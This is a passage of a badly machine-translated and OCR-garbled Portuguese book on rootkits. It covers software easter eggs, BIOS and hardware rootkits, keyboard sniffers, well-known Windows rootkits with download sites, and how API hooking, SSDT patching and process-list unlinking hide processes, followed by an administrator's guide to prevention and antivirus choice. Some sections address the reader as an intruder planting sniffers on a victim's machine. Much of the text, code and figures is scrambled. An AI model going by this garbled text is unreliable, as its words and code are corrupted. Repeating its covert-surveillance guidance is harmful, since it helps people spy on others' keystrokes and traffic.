Quer ver os nomes dos desenvolvedores do Windows?Sem problemas.Abrir 
Internet Explorer e na linha de endereços Enter res: //shdoclc.dll/wcee.htm. 
Uma página vazia com um fundo preto será aberto.Abra seu código fonte e 
Encontre a função onLoad (): 
Função onload () 
{ 
se 
(DECODEST ("GURJPRR") 
! = Window.name) 
Retornar; 
Document.ondragstart 
= Cancevent; 
Document.Onselectstart = cancevent; 
Document.onkeydown 
= Onkydown; 
Elogo.style.visibolyty = ""; 
LoadHashTablet); 
Loadanimation (); 
Comente sobre as linhas 
se 
(DECODEST ("GURJPRR") 
Retornar; 
Window.name) 
E salve o arquivo resultante em um nome diferente.Agora que você está aberto
Esses arquivos no Internet Explorer, a página não estará mais vazia (Fig. 1.3). 
20

pagina: 20

Capítulo 1. 
I <m \ i -mml - Microsoft Internet Explorer 
arquivo 
Edição 
£ id 
Jogado 
Serviço 
S_grai*; 
, * j 
.s5] 
-Vj • -• Pesquise 
• '.vi1brvnov 
(Y^melia 
^ p 
Endereço;(Evf- \] nstah \ 1 .mmml 
Configurações rápidas 
D. 
Ligue a fechadura 
£ Ti Line Lock 
^ 
Ligue a fechadura 
G^ bloqueando iiboa "(em 
?: Ligue a fechadura 
, Assim, 
I..1tti ”4 não: | y”: “i: v'f 
/ r sites confiáveis 
Cesta 
Arraste <yud4 
indesejável 
Publicidades 
Interativo 
J. 
'•/' bkpyuchiga bloqueando 
F - Cookie* 
'£ 
Objetos externos 
SOBRE 
^"" 
° a "y 
T^jl referências 
H & string & m dm*bga 
Eu sou 
Rj* 
Exceções 
Eu sou Gotted 
Arroz.1.3.Os nomes dos desenvolvedores 
janelas 
Você não pode decompor o solitador solitador?Em seguida, clique em "Ctrl" + 
“Shift” + 10. Na janela que aparece, clique no botão de interrupção, um 
Em seguida, faça um movimento - depois de um segundo, o Solitaire será apresentado. 
E aqui está outra característica interessante da palavra russa.Palavra aberta e 
Digite a linha representada na FIG.1.4.Depois de entrar nesta palavra 
Ele será fechado instantaneamente sem salvar dados. 
Capacidade legal da pessoa de ter direitos civis e assumir responsabilidades 
Arroz.1.4.Entre nesta linha, tendo preservado anteriormente 
dados 
Os desenvolvedores do Excel gostam muito de vários brinquedos tridimensionais.EM 
Excel 2000 "costurado" como Neeed for Speed, no Excel 97 - Emulador de vôo 
(Simulador da situação) e no Excel 95 - Doom.Agora você entende para onde vai 
Nosso lugar no disco?Se você está interessado em como "brincar de carros", re
Eu ordeno que você visite a página da web h t p: // www.I z c i t y.Com/dados/SOF T/ 
Artigo372.htm.Lá você encontrará uma descrição de vários ovos de Páscoa, 
21

pagina: 21

Rootkits 
É verdade que para versões antigas do Windows e do Office.Eu também recomendo o teste
Artigo de Tato "Ovos de Páscoa para 1 de abril" 
(http://www.inauka.ru/ 
Rggets/article30824/print.html). 
Não há necessidade de pensar que os ovos de Páscoa estão apenas em produtos da Microsoft 
- Eles estão cheios de todos os lugares.Eles estão no Photoshop, em Delphi.Por exemplo, para ver 
Delphi Developers nomes, execute a ajuda-> sobre comando e depois em 
Pressionada tecla “Alt”, digite a equipe (Fig. 1.5). 
É sobre Delphi 
.Jnj2 <! 
L^<ag*.lg- | 
B a r n u m m 
T & rri 
AK11 & p 
Davidl 
Sobre Art O S 
B a u e r 
Berneua 
Arroz.1.5.Ovo de Páscoa em Delphi 
Você pode falar sobre ovos de Páscoa por um longo tempo, até dedicar um separado 
um livro, mas eles não têm nada a ver com a rota, exceto que eles se escondem 
Quase tão bom.Eu falei sobre eles apenas para você um pouco 
Nós descansamos em frente ao próximo parágrafo. 
1.5.Hardware e software rutkin 
1.5.1.Hardware e software Rutkin - Artilharia pesada 
Imagine a seguinte situação.Você penetrou no escritório da sua estaca
Pernas cuja senha você deseja saber.Ou nem sequer penetrou, mas simplesmente para
Eles procuraram perguntar como são as coisas: afinal, você não é um "alienígena", mas "seu próprio".E no escritório também
Quem não era ... em uma palavra, você recebeu acesso físico ao computador 
vítimas.E se você é um administrador do sistema, terá esse acesso 
E sem truques - por exemplo, sob o pretexto de instalar uma nova versão 
programas ou configurações de computador. 
22

pagina: 22

Capítulo 1. 
Você reinicia o computador e carrega da sua bota 
CD.Depois disso, você escreve a raiz no computador do BIOS, e 
Também no quadro de rede do BIOS.Toda a operação leva não mais de dois minutos 
Então você pode reiniciar o computador novamente para tornar o usuário 
Eu poderia continuar trabalhando. 
O que esse rootkit faz?Sim, tudo o que você o ensina (desde que escreva 
Este Rutkit será você).Ele pode interceptar todos os pacotes de rede 
E envie -os para um computador.Ou talvez intercepte todos os cliques 
Chave e também envie -os para o seu computador - para executar funções 
Sniffer (espião).Ao mesmo tempo, sua raiz funcionará mesmo depois de 
Reinstala as janelas.Este é o hardware e o software rutkin: não 
um dispositivo separado e um programa de baixo nível gravado no santo 
Santos - BIOS.Geralmente, o método de software de hardware é implementado 
Sniffffers - Nunebras da rede ou teclado. 
Também há sniffers puramente de hardware (ou seja, sniffers, não raiz 
como tal): dispositivos físicos conectados a um computador ou 
Redes de vítimas.Eles são muito fáceis de usar: estes estão prontos -dispositivos feitos, 
Para o qual você não precisa escrever o código, nem configurar particularmente.Outros pré.
A propriedade dos sniffers de hardware é que eles são impossíveis 
detectar programaticamente.É verdade, um dispositivo adicional pode
Hacking visivelmente olho nu.Claro, fabricantes de tais lábios
Os enxames fazem todo o possível para disfarçá -los, mas você entende: 
Não importa o quão disfarçado, mas o adaptador entre o ninho do teclado e o plugue do relógio
Viatura será visível. 
Como produtos puramente de hardware, hardware e software enraizado
mas passível de detecção.Se você instalou um software regular 
Rutkin, o administrador pode remover o disco rígido, conectar -se a outro 
computador e inicie um anti -Rhubar especial ou pilha
antivírus, que também têm função anti -resposta
Yami.Ao mesmo tempo, com uma probabilidade muito alta, sua raiz será descoberta 
E neutralizado. 
Mas a raiz do programa de hardware sobreviverá até o Reformatir
Winchester e reinstalando as janelas.Para removê -lo, você precisa 
"Revelar" biografos, e o usuário, até qualificado, por este 
Não estará envolvido.Claro, existem fundos para a digitalização 
BIOS, mas você ainda precisa pensar nisso.Então, essa raiz vai viver 
O sistema é muito mais longo que o software puramente, mesmo que não esteja incluído 
nas intenções do administrador do sistema. 
A principal desvantagem de hardware e software é a dificuldade 
implementação.Não pense que a modificação do BIOS é muito simples.Para isso 
23

pagina: 23

Rootkits 
O BIOS é diferente em todos os lugares.Você pode escrever rootkit (sniffer) para biografias 
Do prêmio, mas em computadores com BIOS da AMI, não funcionará mais.PARA 
o mesmo BIOS pode ser um fabricante, mas instalar em 
Placas -mãe de diferentes fabricantes e, portanto, funcionando
Tocar um pouco diferente.Isso também precisa ser levado em consideração.A propósito, é por isso 
Neste livro, nem tentaremos gravar algo no BIOS. 
Exatamente a mesma situação com o quadro de rede.SunIffer de pacotes, implementado
Puramente software, usando os meios do sistema operacional, 
Trabalhará com quaisquer placas de rede para as quais o driver estiver instalado. 
Mas o sniffer de hardware escrito para a placa de rede Intel não será 
Trabalhe no quadro de rede 3com. 
Além da diferença na arquitetura, é necessário levar em consideração a diferença nas versões 
BIOS.Em geral, a essência é clara: hardware e programadores são muito fortes
Mas eles dependem do próprio hardware. 
Outra desvantagem é a necessidade de acesso físico a com
Pudher ou rede de vítimas.Se o hardware e o software ainda estiverem
pode ser instalado remotamente, então, no caso de um sniffer puramente de hardware, não 
Vá sem trabalho com as mãos.É verdade, essa desvantagem não é uma essência
Nen, porque geralmente os sniffers de hardware são instalados "contra seus", 
Isto é, você tem acesso físico à rede ou pode livremente 
pegar. 
Idealmente, se você, cracker, administra esta rede: você pode 
É crível explicar a presença de um dispositivo de rede adicional, 
Se for encontrado. 
1.5.2.Sniffers de rede 
Existem dois tipos de nusfros de rede.Os primeiros estão conectados por direto
o pagamento em rede da vítima do computador e se destina apenas a 
Intercepção de pacotes deste computador.O segundo interceptar os pacotes de todos 
estações de trabalho de rede e estão conectadas à rede como um lábio de rede separado
enxame (por exemplo, como um servidor de impressão). 
Normalmente, os sniffers de hardware de rede não construíram -em memória para 
armazenamento de pacotes.Pacotes interceptados são simplesmente transmitidos ao seu COM
Pudter, então depois de instalar esses sniffers, você precisa de alguns 
Configuração: pelo menos você deve especificar o endereço IP do seu computador. 
Redes do segundo tipo - dispositivos absolutamente legais em 
Rede.Eles são usados ​​não apenas por invasores para interceptar senhas, 
24

pagina: 24

Capítulo 1. Hard do ponto de vista do cracker 
Mas também administradores bastante respeitáveis ​​para análise de tráfego. 
Um programa de analisador instalado no seu computador (inclui 
no conjunto de entrega), permite que você determine, por exemplo, quem e quanto sobre
Sentei -me na internet que visita sites de "adultos", etc.
Bônus ruim, o administrador ganha acesso a cada transferido 
O pacote, portanto, pode olhar para as senhas de alguém. 
Normalmente, os sniffers de rede são instalados pelos administradores.Afinal 
O custo de alguns deles excede US $ 1.000.Quanto 
Deve haver a informação que você vai interferir
Tit para comprar um dispositivo para esse tipo de dinheiro! 
Um dos tunphones de rede de software mais populares é 
NetLogger da Unispeed (http://www.unispeed.com).Seu custo depende 
a partir da configuração da sua rede e é determinado individualmente para cada 
cliente. 
1.5.3.Sniffers do teclado 
O sniffer do teclado é um dispositivo em miniatura que está cansado
derramado no ninho de teclado, e o próprio teclado é conectado através disso 
dispositivo.Normalmente, os nuciffs do teclado estão equipados com memória flash 
Para armazenamento de teclas interceptadas. 
Você instala um sniffer de teclado, por exemplo, no início do dia. 
O usuário provavelmente não o notará: com que frequência alguém olha para 
No painel traseiro da unidade do sistema?No final do dia, você está filmando um sniffer, e 
Todas as senhas que o usuário inseriu (incluindo a entrada do sistema) 
No seu bolso.Você conecta o dispositivo ao seu computador e conta
Essas informações inseridas pelo usuário no dia.Tudo é muito 
Apenas. 
O nuciff de teclado de hardware pode ser encontrado 
Antivírus, e sua instalação leva muito pouco tempo. 
O custo das tonsíferas do teclado depende do tamanho da memória flash.Aqui, 
Por exemplo, os preços do teclado KeyGhost Sniffer (Tabela 1.1). 
Você pode comprar o keyghost sniffer em http: // www.Keyghost.com. 
Além do Keyghost, existem outros sniffers.Você pode encontrá-los em 
Internet.No futuro, escreveremos nosso próprio teclado 
Sniffer - é claro, software. 
25

pagina: 25

Rootkits 
Tabela 1.1.Preços para o alto -falante do teclado de hardware 
Modelo 
Edição Home Externa Keyghost 
Padrão de keyghost externo 
Profissional externo de Keyghost 
Keyghost profissional externo se 
Descrição 
128 kb de memória flash, sem cifra
Vania 
512 KB, criptografia básica 
1 mb, 128 bits criptografia 
2 MB, 128 bits criptografia 
Ts e n a, $ 
89 
99 
149 
199 
ARROZ.1.6.Sniffer Keyghost Home Edition: Antes e depois da instalação 
Arroz.1.7.Sniffer keyghost sx (512 kb) no valor de US $ 149 e o procedimento para conectá -lo 
1.6.Conheça - Rootkuts 
1.6.1.As rotas mais populares 
É hora de se familiarizar com os Rutkuts mais populares. 
• 
Fu Rootkit - permite ocultar processos, aumentar o privilégio
O processo do processo e também permite ignorar o Windows Event Viewer. 
Na versão mais recente, tornou -se possível esconder os motoristas 
dispositivos. 
26

pagina: 26

Capítulo 1. 
• 
NER 4NOOK (HE4HOOK2I5B6.ZIP) - Um popular rutkit russo. 
• 
O defensor do hacker rootkit é um rutkin muito popular para Windows, 
Falaremos sobre ele com mais detalhes. 
• 
NT Rootkit (RK044) é um Rutkin bastante popular, mas, mas, 
Apesar de ele não ter sido atualizado há muito tempo, ele ainda é bom. 
• 
VanQuish - é uma interpretação de DLL com base em 
Rutkin romeno.Permite ocultar arquivos, catálogos, chaves 
Registro e também protocolos senhas. 
• 
Afx rootkit também é um nível muito comum de rutkitus de Paul
Um chamador que permite ocultar arquivos, catálogos, seções de registro 
e conexões de rede.Ele contém um utilitário com gráficos
a interface para criar novas rotas.Lembre -se de como 
Antigamente, havia laboratórios virais que permitem os contras
É verdade os vírus mais diversos? 
Você pode baixar tudo isso, exceto AFX, na zona-h (http: / / ru. Zone-h .org / 
ru/download/categoria = 2). 
Se você precisar das versões mais recentes do Rutkin, visite o site 
www.rootkit.com.É verdade, há um pouco mais difícil de baixá -los - precisamos 
registro e se você quiser baixar algo realmente muito útil 
ou ultramoderno, então você terá que "crescer" para um certo nível, 
Participando de projetos rootkit.com.Este site será uma boa ajuda como 
para um rutkitator e para o administrador: a partir daí você não pode apenas 
Baixe os códigos de origem, mas também leia sobre os princípios do trabalho de um ou outro 
Rutkin, que facilita muito sua detecção. 
No próximo parágrafo, falaremos sobre populares em nossas expansas 
Rutkin Hacker Defender. 
ATENÇÃO! 
Ao carregar uma das rotas, em nenhum caso não as inicie no seu carro! 
Se você quiser experimentar Rutkin, instale uma máquina virtual 
VMware, "Inside", que instala a versão do Windows que você precisa.Lançar 
Rutkin já precisa no Windows Virtual - para proteger seu computador de 
infecção. 
1.6.2.Princípios gerais do trabalho de Rutkin 
Já sabemos que qualquer rootkit "decente" deve ser capaz de se esconder
Cesses, arquivos e seções de registro.Como ele faz isso?Considere a ocultação 
Processos - Ocultar arquivos e registro é executado da mesma forma. 
27

pagina: 27

Rootkits 
Suponha que o administrador do sistema entre no comando da lista de tarefas, retirando
uma lista de processos.Eu concordo, em nosso tempo, nem todo administrador 
Ele conhece a existência de tal equipe.Então suponha que ele esteja pressão
ET “Ctrl” + “Alt” + “Del” para ligar para o Windows Task Manager.Em qualquer 
No caso, ele deseja ver a lista de processos realizados no momento. 
Na fig.1.8 descreve o utilitário da lista de tarefas e na Fig.1.9 - Despachante de tarefas. 
Arroz.1.8.Utilitário da lista de tarefas 
Para retirar uma lista de código de processo (lista de tarefas ou gerenciador de tarefas) 
deve causar uma função de API sistêmica que retorna a lista sua
Sistemas concluídos (por exemplo, a mesma função NtQuerySystemlnFormation 
Da biblioteca n t d l l.d l l).Função NtQuerySystemlnFormation in 
Por sua vez, causa a Ormation ZwQuerySyStymlnf.
Nível de núcleo que usa interrupção do Windows (int 0x2E).Função 
Os níveis de núcleo se voltam diretamente para o núcleo e recebem da estrutura 
PSActiveProcessList List of Processos realizada, que está em muito
O gelo é transmitido "para cima" (para o nível do usuário) e o programa, 
A informação NtQuerySystemLNAss causou a função, leva -a para a tela. 
28

pagina: 28

Capítulo 1. 
£ "* Windows Tasks Manager 
-= p 
Parâmetros de arquivo 
Eid 
O trabalho final 
Referência 
Formulários 
Processos] Speed) Rede 1 Usuários 1 
O nome da imagem 
Cmd.exe 
Ctfmon.exe 
RúnDU.32.exe 
post post.exe 
NV5VC32.EXE 
Mdm.exe 
5Poolsv.exe 
Exfttorer.exe 
Taslwgr.exe 
Svchost.exe 
5VCH05T.EXE 
Totalcmd.exe 
Svchost.exe 
Svchost.exe 
Svchost.exe 
L5a5s.exe 
Serv1ces.exe 
Winlogon.exe 
CSRS5.EXE 
SMS5EXE 
Winword.exe 
Ópera, exe 
Sistema 
Inação com e e. 
J o nome do usuário j 
Denis 
Dentes 
Dentes 
Sistema 
Sistema 
Sistema 
Sistema 
Denis 
Denis 
Serviço local 
Serviço de rede 
Denis 
Sistema 
Sistema 
Sistema 
Sistema 
Sistema 
Sistema 
Sistema 
Sistema 
Dentes 
Dank 
Sistema 
Sistema 
Tsvddd 
00 
00 
00 
00 
00 
00 
00 
00 
01 
00 
00 
00 
00 
00 
00 
00 
00 
00 
01 
0 0 
00 
00 
00 
98 
Memória 
1 572 KB 
1 2 3 6 KB 
796 KB 
13 644 KB 
724 KB 
692 KB 
1 5 9 2 KB 
11 752 KB 
4 644 KB 
1 188 KB 
1 012 KB 
12 808 KB 
9 764 KB 
2 908 KB 
I 636 KB 
9 1 6 K B 
1.844 kb 
408 KB 
2 548 KB 
36 kb 
39 408 KB 
30 008 KB 
68 kb 
20 kb 
G "Strezn os processos de todas as bebidas5 
Grutz completo J. 
^Processos: 2s 
: 3 -Carregando CPU: 5% 
Emergência de pensão: 215468kb / 6 
Arroz.1.9.Gerenciador de tarefas 
Rutkin pode intervir no trabalho
Esse programa.Ele 
pode, por exemplo, interceptar re
abafar 
ZWQUERYSYSTEMLNFORMAÇÃO E ,, 
modificando -o (removendo -o de 
Lista de processos necessários para ele 
processos), transfira a mudança 
Lista de funções 
Ntquerysys-
Temlnformation.Ele pode
intervir no trabalho da função 
NtQuerySystemlnformation, 
para que ela deriva esse resultado 
O que ele precisa.Isso é mais fácil, mas em 
Nesse caso, há mais risco de encontrar
Rutkita. 
E em geral, quanto menor o nível, em 
quais Rutkin funciona, o 
menos provável de encontrar
Zhenya.Finalmente, Rutkit pode 
Trabalhe no anel de proteção zero e modifique a própria estrutura 
PSActiveProcessList.Nesse caso, é quase impossível
Ruff enquanto ele está na memória. 
A segunda maneira de confundir agentes anti -reguladores é agir em nome 
outro processo.Você pode, por exemplo, modificar o arquivo Explorer.EHE, 
para que ele lê a lista de programas executados automaticamente não de 
Klyuchanksi [nkm] \ software \ microsoftwindows \ currentVersion \ run, 
E de qualquer outro.Claro, para modificar o condutor que você precisa 
Desative o serviço de proteção de arquivos do Windows, mas na presença de direitos de administrador
trator (e eu já observei que a maioria dos usuários do Windows está funcionando 
no sistema com os direitos do administrador) isso não é difícil de alcançar - nem mesmo 
Teremos que reiniciar o Windows. 
Rutkuts (tanto no Windows quanto no Linux) têm dois tipos: Rutkuts 
Nível do usuário (nível do usuário) funcionando no espaço de endereço
TV de programas aplicados e níveis nucleares de Rutkita (nível de kernel), usando
memoria do sistema. 
As rotas também são divididas pelo método de implementação: 
• 
Rutkuts modificando o modo de execução; 
• 
Rutkitianos, modificando diretamente os objetos do núcleo. 
29

pagina: 29

Rootkits 
1.6.3.Rutkin Hacker Defender 
Defender Hacker refere -se ao primeiro tipo (modificação do caminho de execução). 
Além disso, o trabalho de rootkit de Vanquish e Afx por esse princípio.Nível de rutkitianos
Os núcleos NYE ​​são menos comuns.As rotas mais famosas deste grupo
Py é fu e phide. 
Um dos métodos populares usados ​​pelos rutkuts é
Grupo de chamadas de API.O mais interessante é que esse método é muito bom
É fosionado pela própria Microsoft Corporation.Está claro que inicialmente ele 
Não foi desenvolvido para criar rotas, mas os autores do Rutkin com prazer
Usou isso. 
Considere a interceptação das chamadas da API usando o exemplo do Hacker Defender.Interceptação é 
Substituindo os primeiros bytes das instruções do código da função da API para uma transição incondicional 
para o código de outra função localizada no espaço de endereço do programa. 
Para isso, o endereço da função desejado é calculado, então um lugar é dado na memória 
Para o código da nova versão da função e seu código -fonte, que também é preservado
Acesse - para uso subsequente. 
Quando o programa do usuário causa uma função da API (deixe o mesmo 
NtQuerySystemlNformation), a chamada é transmitida à preliminar
processamento de dados que pode causar a função inicial e que, em 
por sua vez, causará a função de processar os resultados e dar tudo 
Resultados (informações sobre todos os processos de execução).Função sobre
O trabalho dos resultados pode excluir alguns registros, por exemplo, um registro, 
contendo informações sobre o arquivo Rutkin mais executável.Acontece que, 
que o usuário não vê uma lista real de processos, mas modificada
Uma lista de Rutkin. 
-
* Inserindo a função da API 
Eu g 
Função preliminar 
processamento de dados 
1 
1 
. 
• ' 
A função inicial 
Função de processamento 
resultados 
Arroz.1.10.Função da API de interceptação 
trinta

pagina: 30

Capítulo 1. 
A interceptação da função da API também pode ser implementada no nível do núcleo.Em pe
Relé no anel de proteção zero da função da API do usuário 
O nível causa uma interrupção de 0x2e.Como um parâmetro deste pré
O índice da função necessário é transmitido ao despejo - em nosso caso 
Funções ZwQuerySystemlnf Ormation.Na função da função, use
Zuya Tabela SSDT (tabela de expedição de serviços de sistema), você pode descobrir 
Endereço de qualquer função de baixo nível.A tabela SSDT é carregada 
Programa Ntoskrnl.exe.De fato, o programa çoskrnl.exe é 
Micro -Yard nt 
Algumas rotas (mas não o defensor do hacker) modificam o endereço na guia
Pessoa do SSDT para que ele indique a função que é criada por ele 
Rutkin.Isso pode ser alcançado escrevendo um módulo separado de Rutkita, para
O único funciona como o driver do dispositivo.Você pode, é claro, do habitual
Aplicativo do usuário na presença de gênero apropriado
Nomachi para controlar o dispositivo \ dev \ físicoMememory, que permite 
Trabalhe diretamente com a memória do núcleo. 
Além disso, o princípio é o mesmo que no caso da função usual da API: primeiro 
A função de processamento preliminar é lançada, que executa o OP
Ações retornadas e, em seguida, aciona o código da função inicial.Depois disso 
A função de processar os resultados é causada, o que leva o resultado a 
Espécies necessárias Rutkin. 
Essa técnica, a propósito, é usada não apenas por rotas, mas também para programas, 
Protegendo um computador das rotas. 
Alguns rutkin, como Fu, trabalham de maneira diferente.Por que mudar 
Funções se já chegamos ao anel de proteção zero?Afinal 
É muito mais fácil modificar a tabela do sistema imediatamente.Rutkin Fu 
Modifica a lista de PSActiveProcessList, visualizada
a informação zwquerySyStymlnnnNofing removendo informações sobre você e 
Sobre os processos que ele deve esconder.Removendo o processo da lista 
não leva ao fim deste processo, pois a distribuição 
O tempo do processador no Windows é baseado não em processos, mas em 
Fluxos. 
A lista de PSActiveProcessList é o dobro, ou seja, contém um decreto
TELS nos processos anteriores e subsequentes na lista.Considere como 
Uma lista de processos antes e depois da modificação se parece (Fig. 1.11). 
Da mesma maneira, alterando as tabelas do sistema, Rutkin pode ocultar arquivos e 
portas, aumentar as prioridades do processo e muito mais. 
31

pagina: 31

Rootkits 
1 p 
Smss.exe 
a 
• 
Svchost.exe 
• • 
1 
Fu_rootkit 
EU 
ExploreRexe 
S i u i b m 
r .. 
Smss.exe 
T., 
Svchost.exe 
a 
r 
Fu_rootkit 
"1 
E3q> lm> t? 
Antes 
Depois 
Arroz.1.11.Lista de processos ativos antes e depois da intervenção 
32

pagina: 32

Capítulo 2. Hack 
Do ponto de vista 
Administrador 
• 
Prevenção 
• 
TRATAMENTO 
• 
Detecção de Rutkin significa 
• 
Detectores de Rutkin 
Rootkits 
2 Zak.665

pagina: 33

Neste capítulo, falaremos sobre a técnica geral de detectar as rotas, bem como 
Sobre programas para automatizar esta tarefa.Vale a pena notar 
que a total confiança de que seu computador não foi deixado e depois
Dov Rutkita, não pode nem dar format.com.Sim, mesmo se você estiver relendo
Fazendo todos os discos do seu computador, há uma chance de que 
Rutkin permanecerá na memória flash.Mas esse rutkin é uma raridade, então 
Você não precisa se preocupar, caso contrário, pode se tornar um paranóico. 
Portanto, duas situações são possíveis.O primeiro é quando o seu computador está limpo ou 
Você acha que ele está limpo e deseja se proteger dos Troyans.O segundo é 
Quando algo se estabelece no seu computador e você deseja remover a água
Convidado Swist do sistema.Primeiro, falaremos sobre prevenção. 
2.1.Prevenção 
Você assume que seu computador "limpo"?Premissas
Exatamente: você precisa ter certeza da limpeza.Portanto, estamos armados com scanners, 
que será descrito mais adiante neste capítulo e testará o sistema. 
Se o scanner descobriu algo, então o próximo lerá 
O ponto em que falaremos sobre o tratamento do seu computador.Se 
Seu computador é realmente "limpo", então você pode iniciar um profissional
Lactik. 
Claro, o caso ideal é um computador vazio no qual nada 
Instalado além do próprio Windows. 
34

pagina: 34

CAPÍTULO 2. TODO -UP do ponto de vista do administrador
2.1.1.Criando uma conta de usuário comum
Primeiro de tudo, excluímos todas as conexões da Internet: em uma rede local,
Comprometido, na linha dedicada.Depois disso, criamos um regular
Usuário, não administrador.Na Microsoft, isso é chamado de ogra
Nota Conta.Está sob esta conta que você será
Trabalhe na internet.A conta do administrador permanecerá apenas
para manutenção do sistema: configurações, instalação de programas, com
Edifícios de conexão de rede, etc.
grama será muito menos capacente se for lançado de
o nome de um usuário comum com muito deficiência e
Não em nome do administrador.
É aconselhável colocar uma senha na conta do administrador, mesmo
Se você está sozinho no computador.E então você nunca sabe: mesmo um parente
Os apelidos podem instalar um sistema de teclado para descobrir o seu
Senhas para a Internet.
Depois de criar uma conta limitada, crie uma conexão
a internet e observe que eles estarão disponíveis para outros usuários
sistemas.
Digite o nome e a senha da conta do provedor de serviços de Internet, anote e
Mantenha um lugar seguro.{Entre em contato com o fornecedor se estes estes
inteligência.)
Nome de usuário;Jdhsilabs
Paool:
!• • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • •
Confirmação:
{• • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • •
U Usemos o seguinte nome de usuário e senha ao conectar
qualquer usuário:
R Faça essa conexão com a Internet por padrão
V V. detalhe o firewall para se conectar à Internet
<De volta
]
Avançar -* !
Cancelamento
Arroz.2.1.Criando uma nova conexão
Não é necessário incluir um firewall para conexão: vamos instalar
Firewall próprio, mais informativo do que uma marca completa
Janelas de Mauer.
35

pagina: 35

Rootkits 
2.1.2.Instalação de antivírus 
Registre -se no sistema como administrador e instale um antivírus. 
Que antivírus deve ser instalado?Bons resultados mostram 
Antivirus Kaspersky (AVP anterior).Pessoalmente, eu o uso.Mas para 
Não havia livro de publicidade, vamos falar sobre a escolha do antivírus em geral, e você já 
Decida por si mesmo que você usa. 
Existem muitos critérios para escolher um antivírus - tudo depende de como você 
Você o usará, bem como das especificidades do seu trabalho diário
Você.Vamos começar com critérios gerais. 
O primeiro critério é o número de vírus que podem determinar
Antivírus.Aqui você precisa ter cuidado.O fato é que diferente 
Empresas de diferentes maneiras declaram as características quantitativas do anti -
Bases rusny.Alguns antivírus, como o DRWeb, relatam o número de BA
liga em seu banco de dados e alguns (Kaspersky Antivirus, 
Além disso, o número de vírus e todas as suas modificações.Claro, no segundo 
No caso do número declarado, será várias vezes maiores. 
Além disso, diferentes empresas consideram os vírus de maneira diferente.Por exemplo, 
Kaspersky Laboratory considera vírus dos programas de espionagem 
(Spyware), backdoor, adware e outros programas de programas.Isso também afeta 
O número de vírus, mais precisamente, no número de registros no banco de dados.Por exemplo, como de 
15 de dezembro no banco de dados KAV 155 337 e no banco de dados DRWEB - 96 344. Mas isso não é 
Isso significa que o DRWeb é pior que Kav. 
Depois de instalar qualquer antivírus, é necessário atualizar seus bancos de dados. 
É desejável que seu antivírus escolhido tenha a oportunidade 
Atualização automática de bancos de dados sobre a rede.Existe essa oportunidade 
DrWeb e Kav. 
Desde que conversamos sobre a atualização das bases antivírus, depois de escolher um anti -
Apresente -se do vírus com que frequência as atualizações dessas bases são produzidas.Bases 
Os dados de kav e drweb são atualizados com muita frequência, então eu recomendo
construir uma atualização automática para que suas bases antivírus sejam 
Constantemente no estado atual.Mas as bases de alguns "importados" 
Os antivírus são produzidos muito menos comum, por exemplo, uma vez por mês ou 
Mesmo uma vez por semana, é melhor não usá -los. 
Por que?Imagine tal situação.Bases antivírus de antivírus A 
Atualizado a cada hora e as bases antivírus de antivírus B - uma vez por semana. 
Imagine também que alguém Ivanov escreveu um vírus e o postou sob o nome
nim "nfsu2mw_traineer.exe".O vírus começa, diz ao usuário que 
O programa não começa, pois foi danificado ao baixar 
36

pagina: 36

CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
Da Internet e, enquanto isso, o computador está lentamente infectado.você 
Usuários do antivírus A, há chances de detectar o vírus em uma hora. 
Obviamente, ninguém garante que esteja na atualização atual que será 
Este vírus é descrito, mas ainda é melhor do que esperar pelo "remédio"
uma semana, como no caso de B. vírus 
Continuamos para o próximo critério - para o apoio dos pacotes de executáveis 
arquivos.Um bom antivírus deve ser capaz de lidar com vários UPAs
combustível com arquivos, que são frequentemente usados ​​pelos desenvolvedores de VI
Rusov.Afinal, eles precisam passar o vírus na Internet, e menos haverá 
O tamanho do arquivo de vírus executável, melhor. 
Também será importante pela presença de um analisador heurístico na composição
VE antivírus.O que é isso?Normalmente, o antivírus simplesmente digitaliza arquivos, 
Verificando -os com amostras de código viral de suas bases antivirais.Se sobre
Não há deslumbramento, então o vírus é impossível de detectar.Mas alguns antivírus 
Existe um analisador heurístico.Este analisador é capaz de analisar 
ações que são executadas por vários programas.Se ele vê, 
que as ações de um determinado programa são semelhantes às ações do vírus, então 
Ele emite um aviso: eles dizem que o arquivo é tão semelhante a um vírus desse tipo. 
Esta é uma função muito importante. 
Acabamos de examinar um exemplo quando um novo vírus aparece,
Go Still não está nas bases do antivírus.Então dissemos que o antivírus B é ruim, 
Porque suas bases antivírus são atualizadas uma vez por semana.Mas se em 
O antivírus B é um bom analisador heurístico, depois bloqueia VI
Rus e avisa o usuário que a operação realizada pelo programa 
Eles são semelhantes às ações de algum vírus famoso.Portanto, antivírus 
B é capaz de compensar ligeiramente a atualização de banco de dados pouco frequente. 
O antivírus pode tratar os arquivos corretamente?Isso também é necessário em
Interessado na instalação de antivírus.Alguns antivírus, 
Especialmente suas versões de teste, elas só podem excluir arquivos infectados. 
Imagine que você pegou um vírus relativamente inofensivo que 
Ele só se propaga em seu sistema, mas não causa danos óbvios. 
Claro, sua própria presença já é dano, mas o dano é menor do que trará 
A versão de teste do antivírus que exclui todos os arquivos infectados.Afinal 
Estes podem ser documentos ou programas importantes. 
Como estamos falando de rutkuts, uma oportunidade importante 
O antivírus será a função de detectar rotas.Existem tais funções e 
DrWeb e Kav.É verdade que eles fazem isso de maneira diferente.Kav usa pl
O trabalho com o disco, um DRWeb é um algoritmo especial para trabalhar com memória. 
37

pagina: 37

Rootkits 
Um antivírus pode remover o vírus ativo (negligenciado)?Alguns 
Eles conseguem fazer isso, mas Kav, por exemplo, se oferece para adiar a remoção 
Vírus antes de reiniciar.No entanto, após a reinicialização, o vírus pode avançar 
Antivírus, começando mais cedo ... Lembro -me do arquivo nesses casos 
O vírus, reiniciado no Linux, e a partir daí eu removo o vírus.Por uma questão de feira
Deve -se notar que Kav, no entanto, remove a maioria dos vírus em 
Recarregar. 
Para proteção máxima, recomendo a instalação de ambos os antivírus - e 
Kav e drweb.Um deles deixou que funcione no modo de monitor e o segundo você 
Você será lançado de tempos em tempos para verificar completamente o sistema. 
Que antivírus lançar no modo Monitor?Desde o monitoramento 
fornece controle total sobre os objetos abertos, é
pode criar uma carga muito forte em seu sistema, então você trabalha 
Será, para dizer o mínimo, desagradável.Eu tenho kav no modo de monitor e 
Eu não sinto a presença dele até que ele encontre nenhum 
vírus. 
